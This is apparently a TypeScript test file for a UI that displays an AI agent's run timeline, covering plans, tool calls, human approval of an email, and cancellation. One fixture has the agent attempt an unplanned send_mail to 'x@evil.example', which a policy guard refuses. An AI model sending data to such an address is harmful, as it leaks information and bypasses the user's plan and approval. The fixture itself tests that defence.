import { fireEvent, render, screen, within } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

import type { RunEvent, RunEventData } from "#learn/agent/types";

import { RunTimeline } from "./run-timeline";
import { foldTimeline, openApprovals, statusOf } from "./timeline";

const usage = { inputTokens: 10, outputTokens: 2, reasoningTokens: 0 };
const mail = {
  callId: "m1",
  tool: "send_mail",
  input: {
    to: ["tom.whitfield@kestrelpay.example"],
    subject: "Q3 terms",
    body: "Payment is due in 30 days.",
    attachmentDocumentIds: [],
  },
  screen: { recipients: ["Tom Whitfield <tom.whitfield@kestrelpay.example>"], flag: 'The body quotes "Heron".' },
};

const log = (...data: RunEventData[]): RunEvent[] =>
  data.map((d, i) => ({ runId: "r", seq: i + 1, at: "2026-10-14T09:00:00Z", data: d }));

const events = log(
  { type: "status", from: "queued", to: "running" },
  { type: "user_message", messageId: "u1", text: "Email Tom the Q3 terms" },
  {
    type: "assistant_turn",
    text: "",
    toolCalls: [
      {
        callId: "plan",
        tool: "make_plan",
        input: {
          goal: "Email Tom the terms",
          steps: [],
          writes: [{ tool: "send_mail", targets: ["Tom"], documents: [] }],
        },
      },
    ],
    usage,
  },
  { type: "tool_result", callId: "plan", ok: true, output: { planned: 1 } },
  {
    type: "assistant_turn",
    text: "Searching first.",
    toolCalls: [
      { callId: "s1", tool: "search_documents", input: { query: "Q3 terms", k: null } },
      {
        callId: "x1",
        tool: "send_mail",
        input: { to: ["x@evil.example"], subject: "s", body: "b", attachmentDocumentIds: [] },
      },
    ],
    usage,
  },
  { type: "tool_result", callId: "s1", ok: true, output: { passages: [{}, {}] } },
  {
    type: "tool_result",
    callId: "x1",
    ok: false,
    error: "Refused by policy: the plan has no recipient x@evil.example.",
  },
  { type: "assistant_turn", text: "", toolCalls: [mail], usage },
  { type: "approval_requested", approvalId: "a1", call: mail, expiresAt: "2026-10-21T09:00:00Z" },
  { type: "status", from: "running", to: "waiting", reason: "approval" },
);

describe("foldTimeline", () => {
  it("folds results into their calls and decisions into their approvals, and skips the noise", () => {
    const items = foldTimeline(events);
    expect(items.map((i) => i.kind)).toEqual(["user", "plan", "text", "tool", "tool", "tool", "approval"]);
    expect(items[4]).toMatchObject({ kind: "tool", result: { ok: false, refused: true } });
    expect(openApprovals(items)).toHaveLength(1);
    expect(statusOf(events)).toBe("waiting");

    const decided = foldTimeline([
      ...events,
      ...log({ type: "approval_decided", approvalId: "a1", decision: "rejected", by: "u" }).map((e) => ({
        ...e,
        seq: 99,
      })),
    ]);
    expect(openApprovals(decided)).toEqual([]);
  });
});

describe("RunTimeline", () => {
  const renderTimeline = (props: Partial<Parameters<typeof RunTimeline>[0]> = {}) => {
    const onDecide = vi.fn();
    const onCancel = vi.fn();
    render(
      <RunTimeline
        items={foldTimeline(events)}
        status={statusOf(events)}
        streamingText=""
        onDecide={onDecide}
        onCancel={onCancel}
        {...props}
      />,
    );
    return { onDecide, onCancel };
  };

  it("shows the plan, the tool calls with their results, and a refusal", () => {
    renderTimeline();
    expect(screen.getByText("Email Tom the Q3 terms", { selector: "div" })).toBeInTheDocument();
    expect(screen.getByText("Email Tom the terms")).toBeInTheDocument();
    expect(within(screen.getByLabelText("Planned writes")).getByText("send_mail: Tom")).toBeInTheDocument();
    expect(screen.getByText("Searched for “Q3 terms”")).toBeInTheDocument();
    expect(screen.getByText("2 passages")).toBeInTheDocument();
    expect(screen.getByText("Refused")).toBeInTheDocument();
    expect(screen.getByText(/the plan has no recipient x@evil.example/)).toBeInTheDocument();
    expect(screen.getByText("Searching first.")).toBeInTheDocument();
  });

  it("shows an approval with the guardrails' warning, and sends the decision", () => {
    const { onDecide } = renderTimeline();
    const card = screen.getByRole("region", { name: "Send this email?" });
    expect(within(card).getByText("Q3 terms")).toBeInTheDocument();
    expect(within(card).getByRole("alert")).toHaveTextContent('The body quotes "Heron".');
    fireEvent.click(within(card).getByRole("button", { name: "Approve" }));
    fireEvent.click(within(card).getByRole("button", { name: "Reject" }));
    expect(onDecide.mock.calls).toEqual([
      ["a1", "approved"],
      ["a1", "rejected"],
    ]);
  });

  it("cancels a live run, and shows text as it streams", () => {
    const { onCancel } = renderTimeline({ status: "running", streamingText: "Drafting the mail" });
    expect(screen.getByText("Drafting the mail")).toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
    expect(onCancel).toHaveBeenCalledOnce();
  });

  it("shows a decided approval without buttons, and a finished run without cancel", () => {
    const done = [
      ...events,
      ...log(
        { type: "approval_decided", approvalId: "a1", decision: "approved", by: "u" },
        { type: "status", from: "waiting", to: "running" },
        { type: "tool_result", callId: "m1", ok: true, output: { sent: true } },
        { type: "status", from: "running", to: "failed", reason: "cap reached: 12 model turns" },
      ).map((e, i) => ({ ...e, seq: 100 + i })),
    ];
    renderTimeline({ items: foldTimeline(done), status: statusOf(done) });
    const card = screen.getByRole("region", { name: "Send this email?" });
    expect(within(card).getByText("Approved")).toBeInTheDocument();
    expect(within(card).queryByRole("button")).toBeNull();
    expect(screen.getByText("Sent")).toBeInTheDocument();
    expect(screen.getByText("Failed: cap reached: 12 model turns")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "Cancel" })).toBeNull();
  });
});
